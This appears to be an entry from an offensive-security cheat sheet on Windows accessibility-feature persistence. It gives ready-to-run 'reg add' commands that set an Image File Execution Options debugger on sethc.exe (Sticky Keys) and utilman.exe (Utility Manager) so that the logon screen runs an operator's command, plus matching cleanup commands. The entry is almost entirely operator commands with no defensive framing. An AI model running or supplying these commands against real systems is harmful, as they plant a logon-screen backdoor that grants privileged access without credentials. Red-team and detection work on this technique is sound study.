---
technique: Accessibility Feature Persistence
category: persistence
targets: Windows Logon UI
protocols: Local
remote_capable: false
tags: windows persistence sethc utilman accessibility ifeo
---

# Accessibility Feature Persistence

Accessibility feature persistence replaces or redirects logon-screen helpers such as `sethc.exe` or `utilman.exe` to run an operator command.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Administrative write access | System binary replacement or IFEO changes require admin or SYSTEM |
| Console access | Logon-screen trigger requires console, RDP, or equivalent access |
| Target helper | Common helpers include `sethc.exe`, `utilman.exe`, and `osk.exe` |

## Windows

### IFEO sethc debugger

#cmd #ifeo #persistence

Set an IFEO debugger for Sticky Keys.

```cmd title:"Set Sticky Keys IFEO debugger"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "$command" /f
```
<!-- cheat
var command
-->

### IFEO utilman debugger

#cmd #ifeo #persistence

Set an IFEO debugger for Utility Manager.

```cmd title:"Set Utility Manager IFEO debugger"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "$command" /f
```
<!-- cheat
var command
-->

### Remove sethc debugger

#cmd #ifeo #cleanup

Remove the Sticky Keys IFEO debugger.

```cmd title:"Remove Sticky Keys IFEO debugger"
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
```
<!-- cheat -->

### Remove utilman debugger

#cmd #ifeo #cleanup

Remove the Utility Manager IFEO debugger.

```cmd title:"Remove Utility Manager IFEO debugger"
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /f
```
<!-- cheat -->

## Linux

No Linux operator command is included here. This note covers Windows logon UI persistence.
